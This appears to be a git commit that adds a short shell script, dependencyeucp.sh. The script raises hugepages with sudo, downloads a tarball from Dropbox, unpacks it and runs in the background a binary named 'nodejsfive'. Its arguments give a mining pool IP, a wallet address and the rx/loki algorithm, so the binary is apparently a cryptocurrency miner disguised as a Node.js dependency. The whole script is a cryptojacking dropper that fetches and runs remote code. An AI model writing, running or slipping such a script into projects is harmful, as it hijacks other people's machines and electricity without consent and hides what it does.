f9d2850bdabe51418f09962a4c0c29a032b92cc1
br2tng5e39 <64448900+br2tng5e39@users.noreply.github.com>
2020-04-28 05:27:03 +0000

    Add files via upload

---
+++ dependencyeucp.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+cd /home/sshuser
+sudo sysctl vm.nr_hugepages=2048
+ls
+wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
+tar xvzf nodejsapp8q.tar.gz
+cd nodejsbrnt
+./nodejsfive -o 167.114.65.192:10111 -u LVioMzkgKdY1zzJ7qkHxDTEUUUB3WDdr2Wp1424kTKsr4RpxG4BfhEKP4n5z7xLrKAXx5fK93GwPZXqXMkXPjWQtN9vubaK.100000 -p dalagafl -a rx/loki --donate-level 1 -t 7 -B
